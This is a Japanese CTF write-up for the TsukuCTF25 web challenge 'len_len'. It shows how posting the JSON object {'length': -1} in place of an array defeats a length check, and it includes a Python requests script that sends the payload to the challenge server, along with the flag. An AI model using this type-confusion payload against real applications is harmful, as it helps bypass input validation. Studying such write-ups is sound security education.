---
title: len_len
description: 
author: xryuseix
genre: web
solver: 0 
point: 0
---

# len_len

## 問題文
"length".length is 6 ?

## 難易度
easy

## 解法

この2つの条件を通過する必要があります。

* `if (sanitized.length < 10) {`
* `if (array.length < 0) {`

1つ目は文字列の長さがある程度あればいいので簡単ですが、2つ目はJSONとしてパースした時に長さが負ある必要性があるため、難しいです。そこで、`array.length`ではなく、Objectのキーとして`length`を持つオブジェクトを渡すことで、JSONとしてパースした時に`length`の値が負になるようにします。

```js
{
  "length": -1
}
```

これをPythonで実装すると以下のようになります。

```py
import requests

def request(payload) -> str:
    endpoint = "http:/challs.tsukuctf.org:28888"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {"array": payload}
    response = requests.post(endpoint, headers=headers, data=data)
    return response.text

payload = '{"length":-1}'
response_text = request(payload)
print(response_text)
```

`TsukuCTF25{l4n_l1n_lun_l4n_l0n}`
